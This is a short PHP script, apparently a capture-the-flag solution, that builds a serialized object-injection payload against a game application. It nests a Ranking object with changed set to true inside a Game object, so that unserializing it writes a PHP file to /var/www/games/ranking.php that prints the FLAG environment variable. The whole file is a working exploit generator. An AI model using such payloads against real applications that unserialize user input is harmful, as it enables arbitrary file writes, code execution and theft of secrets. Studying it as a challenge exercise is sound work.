<?php

class Replay
{
    public $oldGame;
    public $currentGame;
    public $currentPos = 0;

    function __construct($oldGame)
    {
        $this->oldGame = $oldGame;
    }
}

class Ranking
{
    public $ranking = [];
    public $changed = false;
    public $path = "./games/ranking";

    function __construct($path, $changed, $ranking)
    {
        $this->path = $path;
        $this->changed = $changed;
        $this->ranking = $ranking;
    }
}

class Game
{
    public $gameBoard;
    public $score = 0;
    public $actions = [];
    public $initgameBoard;
    public $srand;
    public $name;

    function __construct($initgameBoard, $srand, $score)
    {
        $this->initgameBoard = $initgameBoard;
        $this->srand = $srand;
        $this->score = $score;
    }
}

// print(unserialize('O:7:"Ranking":3:{s:7:"ranking";s:16:$_ENV["FLAG"];s:7:"changed";b:1;s:4:"path";s:15:"/tmp/ozikm7.txt";}'));

$ranking = new Ranking("/var/www/games/ranking.php", true, '<?php echo $_ENV["FLAG"]; ?>');
$game = new Game(0, 0, $ranking);
print(serialize($game));
?>